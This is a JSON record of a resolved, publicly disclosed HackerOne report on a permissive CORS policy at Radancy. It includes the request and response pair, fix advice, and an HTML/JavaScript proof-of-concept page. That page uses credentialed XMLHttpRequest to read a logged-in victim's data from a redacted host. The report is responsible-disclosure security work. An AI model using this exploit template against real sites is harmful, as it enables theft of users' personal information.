{
  "id": 1848730,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODQ4NzMw",
  "url": "https://hackerone.com/reports/1848730",
  "title": "Cross-origin resource sharing: arbitrary origin trusted",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2023-01-27T12:13:15.329Z",
  "submitted_at": "2023-01-27T12:13:15.430Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "kalendra456",
    "url": "/kalendra456",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/vjdf8876hedz3drifzwi82ekxo1c/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 2450,
    "url": "https://hackerone.com/radancy",
    "handle": "radancy",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/lozsi85c1p7jtt7jphw7vzpyocr2/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/lozsi85c1p7jtt7jphw7vzpyocr2/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Radancy",
      "twitter_handle": "",
      "website": "https://radancy.nl",
      "about": "Radancy NL is a full-service agency specialised in employer branding and recruitment advertising in the Netherlands"
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2023-08-22T05:46:59.546Z",
  "bug_reporter_agreed_on_going_public_at": "2023-07-23T05:46:56.256Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "referred from\nCWE-942: Permissive Cross-domain Policy with Untrusted Domains\n\nIssue detail\nThe application implements an HTML5 cross-origin resource sharing (CORS) policy for this request that allows access from any domain.  The application allowed access from the requested origin  https://example.com \n\nrequest\nPOST /sockjs/247/17r_rtj0/xhr HTTP/1.1\nHost: ██████████\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nOrigin: https://example.com\nReferer: https://███████/home\nSec-CH-UA: \".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\"\nSec-CH-UA-Platform: Windows\nSec-CH-UA-Mobile: ?0\nContent-Length: 0\n\nreponse\nHTTP/1.1 200 OK\nServer: nginx\nDate: Fri, 27 Jan 2023 11:47:15 GMT\nContent-Type: application/javascript; charset=UTF-8\nConnection: close\nVary: Accept-Encoding\nCache-Control: no-store, no-cache, no-transform, must-revalidate, max-age=0\nAccess-Control-Allow-Credentials: true\nAccess-Control-Allow-Origin: https://example.com\nVary: Origin\nContent-Length: 2\n\no\n\n\nPOC 2\n1.open https://example.com in browser then inspect the page and go to console.\n2.run the following code in console and you would find it pops up user information\n\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open('post','https://████/sockjs/247/17r_rtj0/xhr',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };\n\nExploit\n\n<html>\n<script>\nvar req = new XMLHttpRequest(); req.onload = reqListener; req.open('post','https://███████/sockjs/247/17r_rtj0/xhr',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };\n</script>\n</html>\n\nComment\nAttacker would treat many victims to visit attacker's website, if victim is logged in, then his personal information is recorded in attacker's server\nHow to fix\nRather than using a wildcard or programmatically verifying supplied origins, use a whitelist of trusted domains.\n\n## Impact\n\nIssue background\nAn HTML5 cross-origin resource sharing (CORS) policy controls whether and how content running on other domains can perform two-way interaction with the domain that publishes the policy. The policy is fine-grained and can apply access controls per-request based on the URL and other features of the request.\nTrusting arbitrary origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. Unless the response consists only of unprotected public content, this policy is likely to present a security risk.\nIf the site specifies the header Access-Control-Allow-Credentials: true, third-party sites may be able to carry out privileged actions and retrieve sensitive information. Even if it does not, attackers may be able to bypass any IP-based access controls by proxying through users' browsers.",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2023-08-22T05:46:56.334Z",
  "allow_singular_disclosure_after": -15151634.647010408,
  "singular_disclosure_allowed": true,
  "vote_count": 12,
  "voters": [
    "zy9ard3",
    "abhhinavsecondary",
    "eminf",
    "shivammusic",
    "safisecu",
    "beeinbeta",
    "init0x1",
    "ix7yupj",
    "blvcc",
    "kravko",
    "and 2 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
